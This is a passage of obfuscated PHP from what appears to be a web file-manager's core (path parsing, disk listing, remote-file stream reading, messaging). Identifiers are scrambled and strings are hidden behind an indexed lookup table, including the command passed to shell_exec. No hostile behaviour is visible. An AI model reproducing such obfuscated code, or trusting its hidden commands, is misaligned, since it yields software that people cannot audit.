self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ËÛøÁêş[$ú¯“Ğ…Ï[1199]] = in_array($ËÛøÁêş[$ú¯“Ğ…Ï[33]], $Îà‰¨·Ñ); return $ËÛøÁêş; } public static function isTruePath($»­€º°ƒ) { $¿ß³²¶ =& $_SERVER[ì…™Î¶Ï]; if (substr($»­€º°ƒ, 0, 1) != $¿ß³²¶[1236]) { return !0; } if (strpos($»­€º°ƒ, $¿ß³²¶[400]) === 0) { return !0; } if (strpos($»­€º°ƒ, $¿ß³²¶[1203]) === 0) { return !0; } if (strpos($»­€º°ƒ, $¿ß³²¶[1238]) === 0) { return !0; } if (strpos($»­€º°ƒ, $¿ß³²¶[1239]) === 0) { return !0; } if (strpos($»­€º°ƒ, $¿ß³²¶[1240]) === 0) { return !0; } return !1; } public static function clear($öò©Ç«í) { $²­»®ÈÕ =& $_SERVER[ì…™Î¶Ï]; $öò©Ç«í = str_replace(array($²­»®ÈÕ[1054], $²­»®ÈÕ[226]), $²­»®ÈÕ[53], $öò©Ç«í); $öò©Ç«í = str_replace($²­»®ÈÕ[98], $²­»®ÈÕ[8], $öò©Ç«í); $÷Ó »¬Ã = $²­»®ÈÕ[1241]; if (substr($öò©Ç«í, 0, 3) == $²­»®ÈÕ[1242]) { $öò©Ç«í = substr($öò©Ç«í, 3); } while (strstr($öò©Ç«í, $÷Ó »¬Ã)) { $öò©Ç«í = str_replace($÷Ó »¬Ã, $²­»®ÈÕ[8], $öò©Ç«í); } $öò©Ç«í = preg_replace($²­»®ÈÕ[1243], $²­»®ÈÕ[8], $öò©Ç«í); if ($öò©Ç«í == $²­»®ÈÕ[8]) { return $²­»®ÈÕ[8]; } $öò©Ç«í = rtrim($öò©Ç«í, $²­»®ÈÕ[8]); return $öò©Ç«í; } public static function sourceID($×ŸÖ‰„à) { $’•˜£í =& $_SERVER[ì…™Î¶Ï]; $ÇËíİëĞ = self::parse($×ŸÖ‰„à); if ($ÇËíİëĞ[$’•˜£í[33]] !== self::KOD_SOURCE) { show_json(LNG($’•˜£í[1244]), !1); } return $ÇËíİëĞ[$’•˜£í[392]]; } public static function make($¨ã¿‰õÍ) { if (!$¨ã¿‰õÍ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¨ã¿‰õÍ)); } public static function makeShare($œß¸’šÒ, $–œªãš­) { return self::makePath(self::KOD_SHARE_ITEM, $œß¸’šÒ, $–œªãš­); } public static function makeFileTypePath($ï€ãÍìµ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ï€ãÍìµ); } public static function makeFileTagPath($øèî®ƒı) { return self::makePath(self::KOD_USER_FILE_TAG, $øèî®ƒı); } public static function makePath($„ˆ®ÓÎÀ, $„÷òóâ = '', $ÁÙÖ•Ç = '') { $ÃÛËÜé =& $_SERVER[ì…™Î¶Ï]; $Ï™¦ûÕÒ = substr($„ˆ®ÓÎÀ, 1, -1); $ŒØ—Ç¶™ = $ÃÛËÜé[1245] . $Ï™¦ûÕÒ . $ÃÛËÜé[1246] . $„÷òóâ . $ÃÛËÜé[1247]; $ŒØ—Ç¶™ = $ÁÙÖ•Ç ? $ŒØ—Ç¶™ . $ÁÙÖ•Ç . $ÃÛËÜé[8] : $ŒØ—Ç¶™; return $ŒØ—Ç¶™; } public static function hashPath($”‘÷òà, $ãÛñ¬‹¡ = true) { $´²ŠšÖ =& $_SERVER[ì…™Î¶Ï]; $‚©İ‚Îè = is_array($”‘÷òà) ? $”‘÷òà : IO::info($”‘÷òà); $éùˆà§Ê = _get($‚©İ‚Îè, $´²ŠšÖ[1248], $´²ŠšÖ[12]); if (!$éùˆà§Ê && isset($‚©İ‚Îè[$´²ŠšÖ[394]])) { $‚©İ‚Îè = IO::info(KodIO::make($‚©İ‚Îè[$´²ŠšÖ[394]])); $éùˆà§Ê = _get($‚©İ‚Îè, $´²ŠšÖ[1248], $´²ŠšÖ[12]); } if (!$éùˆà§Ê && $ãÛñ¬‹¡) { $Á¢÷²²› = KodIO::parse($‚©İ‚Îè[$´²ŠšÖ[78]]); if (!$Á¢÷²²›[$´²ŠšÖ[33]]) { $éùˆà§Ê = IO::hashSimple($‚©İ‚Îè[$´²ŠšÖ[78]]); } } if (!$éùˆà§Ê) { $éùˆà§Ê = md5($‚©İ‚Îè[$´²ŠšÖ[78]] . $‚©İ‚Îè[$´²ŠšÖ[80]] . $‚©İ‚Îè[$´²ŠšÖ[86]]); } return $éùˆà§Ê; } public static function initSystemPath() { $¾âû©÷‡ =& $_SERVER[ì…™Î¶Ï]; if (defined($¾âû©÷‡[1249])) { return; } define($¾âû©÷‡[1249], self::systemPath($¾âû©÷‡[1250])); define($¾âû©÷‡[1251], self::systemPath($¾âû©÷‡[1252])); define($¾âû©÷‡[1253], self::systemPath($¾âû©÷‡[1254])); define($¾âû©÷‡[1255], self::systemPath($¾âû©÷‡[1256])); IOHistory::bindEvent(); } public static function systemPath($ì¢„ä½) { $ÊŠ¿°‘Æ =& $_SERVER[ì…™Î¶Ï]; $Ñ†×¸‡ = $ÊŠ¿°‘Æ[1257] . ucfirst($ì¢„ä½); $¨Ù©„ª– = Model($ÊŠ¿°‘Æ[745])->get($Ñ†×¸‡); if ($¨Ù©„ª–) { return $¨Ù©„ª–; } if ($ì¢„ä½ == $ÊŠ¿°‘Æ[1250]) { $¨Ù©„ª– = self::make(Model($ÊŠ¿°‘Æ[800])->systemRootPathAdd($ÊŠ¿°‘Æ[528])); } else { $¨Ù©„ª– = self::systemPath($ÊŠ¿°‘Æ[1250]); $¥»€·­Ï = self::sourceID($¨Ù©„ª–); $¨Ù©„ª– = self::make(Model($ÊŠ¿°‘Æ[800])->mkdir($¥»€·­Ï, $ì¢„ä½)); } Model($ÊŠ¿°‘Æ[745])->set($Ñ†×¸‡, $¨Ù©„ª–); return $¨Ù©„ª–; } public static function systemFolder($ˆˆÂ·ú•) { $Ã„Æ‚À™ = IO_PATH_SYSTEM_SOURCE . $ˆˆÂ·ú•; $ƒ»×Ù‹ = Cache::get($Ã„Æ‚À™); if (!$ƒ»×Ù‹) { $¨ûšÅÚÂ = IO::infoFull($Ã„Æ‚À™); if (!$¨ûšÅÚÂ) { $ƒ»×Ù‹ = IO::mkdir($Ã„Æ‚À™, REPEAT_SKIP); } else { $ƒ»×Ù‹ = $¨ûšÅÚÂ[$_SERVER[ì…™Î¶Ï][78]]; } Cache::set($Ã„Æ‚À™, $ƒ»×Ù‹, 3600 * 10); } return $ƒ»×Ù‹; } public static function defaultDriver() { return Model($_SERVER[ì…™Î¶Ï][742])->defaultDriver(); } public static function defaultIO() { $ûóıˆûé =& $_SERVER[ì…™Î¶Ï]; $Â¸àş = self::defaultDriver(); return $ûóıˆûé[1258] . $Â¸àş[$ûóıˆûé[392]] . $ûóıˆûé[1247]; } public static function defaultDriverInit() { static $Õ÷‡½µ” = false; if ($Õ÷‡½µ”) { return $Õ÷‡½µ”; } $Õ÷‡½µ” = IO::init(self::defaultIO()); return $Õ÷‡½µ”; } public static function fileTypeList() { $£Í¹ñÕ• =& $_SERVER[ì…™Î¶Ï]; $¾ÉÅ¢Ú = $GLOBALS[$£Í¹ñÕ•[6]][$£Í¹ñÕ•[1259]]; foreach ($¾ÉÅ¢Ú as $¸ÆÛôş” => $ºÔÒÏÚå) { $§…µÖÁ™ = $£Í¹ñÕ•[1260] . $¸ÆÛôş”; $õ¯ÊŠû¨ = LNG($§…µÖÁ™); if ($§…µÖÁ™ != $õ¯ÊŠû¨) { $¾ÉÅ¢Ú[$¸ÆÛôş”][$£Í¹ñÕ•[32]] = $õ¯ÊŠû¨; } } return $¾ÉÅ¢Ú; } public static function diskList($›¹Ñ—‚„ = true) { $õ©åŒò” = $_SERVER[ì…™Î¶Ï][1261]; if ($›¹Ñ—‚„) { $³õî§Õê = Cache::get($õ©åŒò”); if (is_array($³õî§Õê)) { return $³õî§Õê; } } $³õî§Õê = self::diskListGet(); Cache::set($õ©åŒò”, $³õî§Õê, 60); return $³õî§Õê; } public static function diskListGet() { $ê¢€Ôú÷ =& $_SERVER[ì…™Î¶Ï]; $‘Ìğ•ÌÈ = array(); if ($GLOBALS[$ê¢€Ôú÷[6]][$ê¢€Ôú÷[1262]] == $ê¢€Ôú÷[1263]) { $±äÛÃä† = $ê¢€Ôú÷[1264]; for ($÷ªøØ…å = 0; $÷ªøØ…å < strlen($±äÛÃä†); $÷ªøØ…å++) { $ğ¨ªüÍø = $±äÛÃä†[$÷ªøØ…å] . $ê¢€Ôú÷[1265]; if (file_exists($ğ¨ªüÍø)) { $‘Ìğ•ÌÈ[] = $ğ¨ªüÍø; } } return $‘Ìğ•ÌÈ; } if (!function_exists($ê¢€Ôú÷[99])) { $‘Ìğ•ÌÈ[] = $ê¢€Ôú÷[810]; return $‘Ìğ•ÌÈ; } $Ôï¡µå“ = explode($ê¢€Ôú÷[226], shell_exec($ê¢€Ôú÷[1266])); array_shift($Ôï¡µå“); array_pop($Ôï¡µå“); $›£ƒŠäÕ = array($ê¢€Ôú÷[1267], $ê¢€Ôú÷[1268], $ê¢€Ôú÷[1269], $ê¢€Ôú÷[1270], $ê¢€Ôú÷[1271], $ê¢€Ôú÷[1272], $ê¢€Ôú÷[1273], $ê¢€Ôú÷[1274]); foreach ($Ôï¡µå“ as $Ãˆ­’Ğœ) { $§ˆ¶Åó  = preg_split($ê¢€Ôú÷[1275], $Ãˆ­’Ğœ); $ğ¨ªüÍø = $§ˆ¶Åó [count($§ˆ¶Åó ) - 1]; if (!strstr($§ˆ¶Åó [0], $ê¢€Ôú÷[1276]) || !$ğ¨ªüÍø) { continue; } $…É¨È•Ş = rtrim($ğ¨ªüÍø, $ê¢€Ôú÷[8]) . $ê¢€Ôú÷[8]; if (in_array($…É¨È•Ş, $›£ƒŠäÕ)) { continue; } $‘Ìğ•ÌÈ[] = $…É¨È•Ş; } return $‘Ìğ•ÌÈ; } public static function isSameDisk($á ‹æ¾, $ÜıÕÆĞŠ) { $¡÷÷˜ïû =& $_SERVER[ì…™Î¶Ï]; if ($GLOBALS[$¡÷÷˜ïû[6]][$¡÷÷˜ïû[1262]] == $¡÷÷˜ïû[1263]) { return strtolower(substr($á ‹æ¾, 0, 1)) == strtolower(substr($ÜıÕÆĞŠ, 0, 1)); } $ƒÕü¾¿µ = self::diskList(); $ŒÚÛ™Ú = !1; $˜ ç²ö = !1; sort($ƒÕü¾¿µ); $ƒÕü¾¿µ = array_reverse($ƒÕü¾¿µ); $á ‹æ¾ = rtrim($á ‹æ¾, $¡÷÷˜ïû[8]) . $¡÷÷˜ïû[8]; $ÜıÕÆĞŠ = rtrim($ÜıÕÆĞŠ, $¡÷÷˜ïû[8]) . $¡÷÷˜ïû[8]; foreach ($ƒÕü¾¿µ as $ÕÖÂ‚É¯) { $¡¡ÓÀŒÏ = strlen($ÕÖÂ‚É¯); if (!$ŒÚÛ™Ú && substr($á ‹æ¾, 0, $¡¡ÓÀŒÏ) == $ÕÖÂ‚É¯) { $ŒÚÛ™Ú = $ÕÖÂ‚É¯; } if (!$˜ ç²ö && substr($ÜıÕÆĞŠ, 0, $¡¡ÓÀŒÏ) == $ÕÖÂ‚É¯) { $˜ ç²ö = $ÕÖÂ‚É¯; } if ($ŒÚÛ™Ú && $˜ ç²ö) { break; } } return $ŒÚÛ™Ú === $˜ ç²ö; } public static function transferType($¬ì²ñíŒ, $¡ÜËÊó) { $ú­ìÕÈî =& $_SERVER[ì…™Î¶Ï]; $’¢Ô‡°Í = self::driverType($¬ì²ñíŒ); $‘‡”·Ìã = self::driverType($¡ÜËÊó); if ($’¢Ô‡°Í[$ú­ìÕÈî[33]] == $‘‡”·Ìã[$ú­ìÕÈî[33]] && $’¢Ô‡°Í[$ú­ìÕÈî[1277]] == $‘‡”·Ìã[$ú­ìÕÈî[1277]]) { return $ú­ìÕÈî[1278]; } if ($’¢Ô‡°Í[$ú­ìÕÈî[33]] == $ú­ìÕÈî[839] && $‘‡”·Ìã[$ú­ìÕÈî[33]] == $ú­ìÕÈî[107]) { return $ú­ìÕÈî[1173]; } if ($’¢Ô‡°Í[$ú­ìÕÈî[33]] == $ú­ìÕÈî[107] && $‘‡”·Ìã[$ú­ìÕÈî[33]] == $ú­ìÕÈî[839]) { return $ú­ìÕÈî[108]; } return $ú­ìÕÈî[1279]; } public static function driverType($Æ¹§°ûÂ) { $›ÈÈ‘„É =& $_SERVER[ì…™Î¶Ï]; $ŠÙáú· = str_replace($›ÈÈ‘„É[1280], $›ÈÈ‘„É[12], strtolower($Æ¹§°ûÂ->getType())); if ($ŠÙáú· == $›ÈÈ‘„É[733] || $ŠÙáú· == $›ÈÈ‘„É[1281] || $ŠÙáú· == $›ÈÈ‘„É[1282]) { $Æ¹§°ûÂ = self::defaultDriverInit(); } else { if ($ŠÙáú· == $›ÈÈ‘„É[1180] || $ŠÙáú· == $›ÈÈ‘„É[1283]) { $Æ¹§°ûÂ = IO::init($Æ¹§°ûÂ->pathParse[$›ÈÈ‘„É[1127]]); } } $—¦«ôÀÕ = $Æ¹§°ûÂ->path; $ŠÙáú· = str_replace($›ÈÈ‘„É[1280], $›ÈÈ‘„É[12], strtolower($Æ¹§°ûÂ->getType())); if ($ŠÙáú· == $›ÈÈ‘„É[107]) { return array($›ÈÈ‘„É[33] => $›ÈÈ‘„É[107], $›ÈÈ‘„É[1277] => $›ÈÈ‘„É[12], $›ÈÈ‘„É[78] => $—¦«ôÀÕ); } return array($›ÈÈ‘„É[33] => $›ÈÈ‘„É[839], $›ÈÈ‘„É[1277] => $Æ¹§°ûÂ->pathDriver, $›ÈÈ‘„É[78] => $—¦«ôÀÕ); } public static function pathDriverType($ãí´³àˆ) { return $ãí´³àˆ ? self::driverType(IO::init($ãí´³àˆ)) : !1; } } goto e¸å¢ÙÄË; CØÃ÷×›»º: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Ôûîş = false) { } public function exist($°Ë¯çíŠ) { $•Â²—Ìû = $this->info($°Ë¯çíŠ); return $•Â²—Ìû[$_SERVER[ì…™Î¶Ï][194]]; } public function isFile($ç¬’ã¢Ù) { $¿™âŞí² = $this->info($ç¬’ã¢Ù); return $¿™âŞí²[$_SERVER[ì…™Î¶Ï][194]]; } public function isFolder($×«¾à…œ) { return !1; } public function size($Î´‚ö÷) { $‘£Â­¡ì = $this->info($Î´‚ö÷); return $‘£Â­¡ì[$_SERVER[ì…™Î¶Ï][80]]; } public function info($‘†‰ÃÁ×) { return $this->infoParse($‘†‰ÃÁ×); } public function infoAuth($¸Ç®õ Ü) { return $this->infoParse($¸Ç®õ Ü); } public function infoWithChildren($œô¾ßÇ¬) { return $this->infoParse($œô¾ßÇ¬); } public function infoFull($Æ –«î¥) { return $this->infoParse($Æ –«î¥); } private function infoParse($à´Çğ·) { $ÒÂİ¿ =& $_SERVER[ì…™Î¶Ï]; $ “ñÜåƒ = $this->header($à´Çğ·); if (!$ “ñÜåƒ || !$ “ñÜåƒ[$ÒÂİ¿[725]]) { return !1; } $·ø‚»¸˜ = _get($ “ñÜåƒ, $ÒÂİ¿[332], 0); $©ìÊÎ°ˆ = array($ÒÂİ¿[32] => $ “ñÜåƒ[$ÒÂİ¿[32]], $ÒÂİ¿[78] => $à´Çğ·, $ÒÂİ¿[33] => $ÒÂİ¿[192], $ÒÂİ¿[80] => intval($·ø‚»¸˜), $ÒÂİ¿[167] => get_path_ext($ “ñÜåƒ[$ÒÂİ¿[32]]), $ÒÂİ¿[1355] => $·ø‚»¸˜ > 0 && $ “ñÜåƒ[$ÒÂİ¿[1477]], $ÒÂİ¿[1356] => !1); return $©ìÊÎ°ˆ; } private function header($íªôÔ‹Ú) { $›’Î¨°– =& $_SERVER[ì…™Î¶Ï]; if (isset(self::$_cacheHeader[$íªôÔ‹Ú])) { return self::$_cacheHeader[$íªôÔ‹Ú]; } $¯æù¨ ” = isset($GLOBALS[$›’Î¨°–[1478]]) ? $GLOBALS[$›’Î¨°–[1478]] : !1; $GLOBALS[$›’Î¨°–[1478]] = !0; self::$_cacheHeader[$íªôÔ‹Ú] = url_header($íªôÔ‹Ú); $GLOBALS[$›’Î¨°–[1478]] = $¯æù¨ ”; return self::$_cacheHeader[$íªôÔ‹Ú]; } public function hashSimple($ßí·èÃÂ, $–•¶é–İ = false) { $§§íì…‹ =& $_SERVER[ì…™Î¶Ï]; $öŞª¾™¡ = $this->info($ßí·èÃÂ); if (!$öŞª¾™¡ || !$öŞª¾™¡[$§§íì…‹[194]]) { return !1; } $Ü¬É‘–ä = $öŞª¾™¡[$§§íì…‹[80]]; $¸ĞÇâñÒ = 200; $µæ”–—Ã = 50; if ($Ü¬É‘–ä <= $¸ĞÇâñÒ * $µæ”–—Ã) { return md5($this->fileSubstr($ßí·èÃÂ, 0, $Ü¬É‘–ä)) . $Ü¬É‘–ä; } $¦Ç±Ò½š = intval($Ü¬É‘–ä / $µæ”–—Ã); $³•ì™ = $§§íì…‹[12]; $ ó±Œ¢² = timeFloat(); $¿¶é™™¶ = 15; for ($€¹ßı— = 0; $€¹ßı— < $µæ”–—Ã; $€¹ßı—++) { if (timeFloat() - $ ó±Œ¢² > $¿¶é™™¶) { return !1; } $®õ¹©º = $this->fileSubstr($ßí·èÃÂ, $¦Ç±Ò½š * $€¹ßı—, $¸ĞÇâñÒ); if (!$®õ¹©º) { return !1; } $³•ì™ .= $®õ¹©º; } $³•ì™ .= $this->fileSubstr($ßí·èÃÂ, $Ü¬É‘–ä - $¸ĞÇâñÒ, $¸ĞÇâñÒ); return md5($³•ì™) . $Ü¬É‘–ä; } public function getContent($ÜéààÜ×) { return $this->fileSubstr($ÜéààÜ×); } public function fileSubstr($É³ó¼ûô, $ˆŒÓé´· = 0, $äÙ‡´¾û = -1) { $Ø•ñª× =& $_SERVER[ì…™Î¶Ï]; $ˆŸ¡¿Ã¼ = $this->info($É³ó¼ûô); if (!$ˆŸ¡¿Ã¼ || !$ˆŸ¡¿Ã¼[$Ø•ñª×[194]] && $ˆŸ¡¿Ã¼[$Ø•ñª×[80]] > 1024 * 1024 * 10) { return !1; } if ($äÙ‡´¾û === -1) { $äÙ‡´¾û = $ˆŸ¡¿Ã¼[$Ø•ñª×[80]]; } if ($äÙ‡´¾û == 0) { return $Ø•ñª×[12]; } $ÚÙÙöì¸ = array($Ø•ñª×[1479] . $ˆŒÓé´· . $Ø•ñª×[757] . ($ˆŒÓé´· + $äÙ‡´¾û - 1)); $ÚÉ“‰Í = url_request($É³ó¼ûô, $Ø•ñª×[225], !1, $ÚÙÙöì¸, !1, !1, 1); return $ÚÉ“‰Í[$Ø•ñª×[1167]] ? $ÚÉ“‰Í[$Ø•ñª×[1167]] : $Ø•ñª×[12]; } public function download($ä¾Ñ²³, $‹»ÃÒÒ) { Downloader::start($ä¾Ñ²³, $‹»ÃÒÒ); return $‹»ÃÒÒ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ ¹ä’·¡, $ƒ £æ‘ò = '') { $this->info = $this->info($ ¹ä’·¡); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ì…™Î¶Ï][78]]; $this->pathOpen = $ ¹ä’·¡; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ ¹ä’·¡])) { self::$_chunkBuffer[$ ¹ä’·¡] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($îûÒóçÙ) { $Õ‹ÃàÅ = $this->fileSubstr($this->pose, $îûÒóçÙ); $this->pose += strlen($Õ‹ÃàÅ); return $Õ‹ÃàÅ; } public function stream_tell() { return $this->pose; } public function stream_seek($Ó…ûºÈ„, $‹¿çëš¬) { $óÒ½Å®± =& $_SERVER[ì…™Î¶Ï]; if ($‹¿çëš¬ == SEEK_SET) { $this->pose = $Ó…ûºÈ„; } else { if ($‹¿çëš¬ == SEEK_CUR) { $this->pose += $Ó…ûºÈ„; } else { if ($‹¿çëš¬ == SEEK_END) { $this->pose = $this->info[$óÒ½Å®±[80]] + intval($Ó…ûºÈ„); } } } if ($Ó…ûºÈ„ < 0) { $this->pose = $this->info[$óÒ½Å®±[80]] + $Ó…ûºÈ„; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ì…™Î¶Ï][80]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($·‹èÛ¦ı, $¿²†öœú) { $Ä¿ŠÎâ =& $_SERVER[ì…™Î¶Ï]; $ì¤€¥üÅ = $this->info($·‹èÛ¦ı); return array($Ä¿ŠÎâ[1480] => 0, $Ä¿ŠÎâ[1481] => 0, $Ä¿ŠÎâ[16] => 32768 + 511, $Ä¿ŠÎâ[1482] => 0, $Ä¿ŠÎâ[1483] => 0, $Ä¿ŠÎâ[1484] => 0, $Ä¿ŠÎâ[1485] => 0, $Ä¿ŠÎâ[80] => $ì¤€¥üÅ[$Ä¿ŠÎâ[80]], $Ä¿ŠÎâ[1486] => $ì¤€¥üÅ[$Ä¿ŠÎâ[1354]], $Ä¿ŠÎâ[1442] => $ì¤€¥üÅ[$Ä¿ŠÎâ[86]], $Ä¿ŠÎâ[1441] => $ì¤€¥üÅ[$Ä¿ŠÎâ[193]], $Ä¿ŠÎâ[1487] => 0, $Ä¿ŠÎâ[1488] => 0); } static $fileInfo = array(); public function info($œ‰ß¶Ş³) { $½ˆ¹¨à§ = $_SERVER[ì…™Î¶Ï][1489]; if (isset(self::$fileInfo[$œ‰ß¶Ş³])) { return self::$fileInfo[$œ‰ß¶Ş³]; } if (substr($œ‰ß¶Ş³, 0, strlen($½ˆ¹¨à§)) != $½ˆ¹¨à§) { return !1; } self::$fileInfo[$œ‰ß¶Ş³] = IO::info(substr($œ‰ß¶Ş³, strlen($½ˆ¹¨à§))); return self::$fileInfo[$œ‰ß¶Ş³]; } public static function read($¯ÔâÚèÈ, $î‰¸Õ‚, $ÌËõâõš) { if (!isset(self::$_fopenCache[$¯ÔâÚèÈ])) { $ÖÂˆ½¼œ = new StreamWrapperIO(); $ÖÂˆ½¼œ->stream_open($¯ÔâÚèÈ); self::$_fopenCache[$¯ÔâÚèÈ] = $ÖÂˆ½¼œ; } $ÖÂˆ½¼œ = self::$_fopenCache[$¯ÔâÚèÈ]; return $ÖÂˆ½¼œ->fileSubstr($î‰¸Õ‚, $ÌËõâõš); } public static function _read($³ë—àåï, $Ï€Àû°Ñ, $ñöÜƒüß) { $üëİãƒÙ =& $_SERVER[ì…™Î¶Ï]; $úê¥š¤ = fopen($³ë—àåï, $üëİãƒÙ[1358]); if (!$úê¥š¤) { return $üëİãƒÙ[12]; } $ »‘ûİÖ = 8192; fseek($úê¥š¤, $Ï€Àû°Ñ, SEEK_SET); $Ô¦ÕØñƒ = $üëİãƒÙ[12]; $Ò§İÂ² = 0; while ($Ò§İÂ² < $ñöÜƒüß) { $©¯‹æ–è = min($ »‘ûİÖ, $ñöÜƒüß - $Ò§İÂ²); $Ô¦ÕØñƒ .= fread($úê¥š¤, $©¯‹æ–è); $Ò§İÂ² += $©¯‹æ–è; } fclose($úê¥š¤); return $Ô¦ÕØñƒ; } public function fileSubstr($°¢Ğ‡¨•, $ëëåÂê²) { $»õğû‚¸ =& $_SERVER[ì…™Î¶Ï]; $ù¤¡í° = $this->info[$»õğû‚¸[80]]; $»û¦Îƒ = $°¢Ğ‡¨•; $±•Àê³– = $ëëåÂê²; if ($°¢Ğ‡¨• < 0) { $°¢Ğ‡¨• = $ù¤¡í° + $°¢Ğ‡¨•; } if ($ëëåÂê² === !1) { $ëëåÂê² = $ù¤¡í° - $°¢Ğ‡¨•; } if ($°¢Ğ‡¨• + $ëëåÂê² > $ù¤¡í°) { $ëëåÂê² = $ù¤¡í° - $°¢Ğ‡¨•; } if ($ëëåÂê² <= 0) { return $»õğû‚¸[12]; } if ($°¢Ğ‡¨• < 0 || $°¢Ğ‡¨• >= $ù¤¡í° || $ëëåÂê² <= 0 || $ëëåÂê² > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\151\x6c\x65\122\145\x61\x64\x20\145\x72\162\x6f\x72\x21\x20\x73\164\141\x72\x74\x3d{$°¢Ğ‡¨•}\x3b\x6c\x65\156\x67\164\x68\75{$ëëåÂê²}\73\x20\163\x69\172\x65\75{$ù¤¡í°}\73"); } $ùÔê­ô˜ = 64 * 1024; $ã†Ğ¸°µ =& self::$_chunkBuffer[$this->path]; if (!$ã†Ğ¸°µ) { $ã†Ğ¸°µ = array(); } $‰Êøá•â = 0; $† Êì‹ = 0; $ºÖÏÖÃÓ = $»õğû‚¸[12]; foreach ($ã†Ğ¸°µ as $‰Êøá•â => $ºÖÏÖÃÓ) { $‰Êøá•â = intval($‰Êøá•â); $† Êì‹ = $‰Êøá•â + strlen($ºÖÏÖÃÓ); if ($°¢Ğ‡¨• >= $† Êì‹) { continue; } if ($°¢Ğ‡¨• >= $‰Êøá•â && $°¢Ğ‡¨• + $ëëåÂê² <= $† Êì‹) { return substr($ºÖÏÖÃÓ, $°¢Ğ‡¨• - $‰Êøá•â, $ëëåÂê²); } break; } if (count($ã†Ğ¸°µ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($»õğû‚¸[1490], $»õğû‚¸[1491] . count($ã†Ğ¸°µ) . "\73\x73\x74\x61\162\164\75{$°¢Ğ‡¨•}\54\x6c\x65\156\x67\164\x68\75{$ëëåÂê²}\x3b\x70\157\x73\145\x3a{$‰Êøá•â}\x7e{$† Êì‹}"); throw new Exception($»õğû‚¸[1492]); } $ÔÇÇ¯ø = intval($°¢Ğ‡¨• / $ùÔê­ô˜) * $ùÔê­ô˜; $ò½ºÚæ‰ = ceil(($°¢Ğ‡¨• + $ëëåÂê²) / $ùÔê­ô˜) * $ùÔê­ô˜ - $ÔÇÇ¯ø; $¦êù±°º = IO::fileSubstr($this->path, $ÔÇÇ¯ø, $ò½ºÚæ‰); $ã†Ğ¸°µ[$ÔÇÇ¯ø . $»õğû‚¸[12]] = $¦êù±°º; ksort($ã†Ğ¸°µ); $¾‰İáéñ = substr($¦êù±°º, $°¢Ğ‡¨• - $ÔÇÇ¯ø, $ëëåÂê²); return $¾‰İáéñ; } private function log($º¸­ÀÛØ, $ò²Šˆ›à) { $Î‡À«º° =& $_SERVER[ì…™Î¶Ï]; $¶€îñå„ = timeFloat() - $this->timeStart; write_log(sprintf($Î‡À«º°[1493], $º¸­ÀÛØ, $this->info[$Î‡À«º°[32]], $¶€îñå„, $ò²Šˆ›à), $Î‡À«º°[1157]); } } class Message { function __construct() { } public function send($õ½Íµ· = '', $«æ‰¡ÚÃ = array(), $Ë—ûÇ¡ = "\164\x65\170\x74") { $é³ì‹õÛ =& $_SERVER[ì…™Î¶Ï]; $•‹Óó¿Ï = array($é³ì‹õÛ[33] => $é³ì‹õÛ[1494], $é³ì‹õÛ[730] => $õ½Íµ·); if (in_array($Ë—ûÇ¡, array($é³ì‹õÛ[1494], $é³ì‹õÛ[1495]))) { $•‹Óó¿Ï[$é³ì‹õÛ[33]] = $Ë—ûÇ¡; } $«æ‰¡ÚÃ = array($é³ì‹õÛ[506] => isset($«æ‰¡ÚÃ[$é³ì‹õÛ[506]]) ? $«æ‰¡ÚÃ[$é³ì‹õÛ[506]] : $é³ì‹õÛ[12], $é³ì‹õÛ[585] => isset($«æ‰¡ÚÃ[$é³ì‹õÛ[585]]) ? $«æ‰¡ÚÃ[$é³ì‹õÛ[585]] : $é³ì‹õÛ[12]); if (empty($õ½Íµ·) || empty($«æ‰¡ÚÃ[$é³ì‹õÛ[506]]) && empty($«æ‰¡ÚÃ[$é³ì‹õÛ[585]])) { return !1; } $é®èÓá = array($é³ì‹õÛ[1435] => $•‹Óó¿Ï, $é³ì‹õÛ[1496] => $«æ‰¡ÚÃ); Hook::trigger($é³ì‹õÛ[1497], $é®èÓá); } } goto A¨ºïùœ¾ß; C”ç¸–›¹Ê: class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\x66\141\166"; protected function cacheFunctionAlias($‰•ÀïŠ) { $øŞŒšË =& $_SERVER[ì…™Î¶Ï]; return array($øŞŒšË[1905] => array($‰•ÀïŠ[0], $øŞŒšË[1906]), $øŞŒšË[1907] => array($‰•ÀïŠ[0], $øŞŒšË[1908])); } protected function get($Ü‚­ªÂ˜) { $˜ì¾óˆ· =& $_SERVER[ì…™Î¶Ï]; $Î¥„½Ò¥ = Model($˜ì¾óˆ·[513])->metaGet($Ü‚­ªÂ˜, $˜ì¾óˆ·[1909]); $¨Á§‚òŸ = json_decode($Î¥„½Ò¥, !0); return $¨Á§‚òŸ ? $¨Á§‚òŸ : array($˜ì¾óˆ·[1910] => $˜ì¾óˆ·[89], $˜ì¾óˆ·[364] => array()); } protected function set($ßÄ§ÂÂ», $ÙÖùÓ€) { $¡­ó¢õ =& $_SERVER[ì…™Î¶Ï]; $ÙÖùÓ€ = $ÙÖùÓ€ ? $ÙÖùÓ€ : array($¡­ó¢õ[1910] => $¡­ó¢õ[89], $¡­ó¢õ[364] => array()); Model($¡­ó¢õ[513])->metaSet($ßÄ§ÂÂ», $¡­ó¢õ[1909], json_encode($ÙÖùÓ€)); return Model($¡­ó¢õ[513])->metaSet($ßÄ§ÂÂ», $¡­ó¢õ[1909], json_encode($ÙÖùÓ€)); } protected function getByTagID($ŒÎ’÷¼Î, $ü¥­¶·‰) { $ËÈ¯æ¬· =& $_SERVER[ì…™Î¶Ï]; if (!$ŒÎ’÷¼Î || !$ü¥­¶·‰) { return !1; } if (!Model($ËÈ¯æ¬·[513])->getInfoSimple($ŒÎ’÷¼Î)) { return !1; } 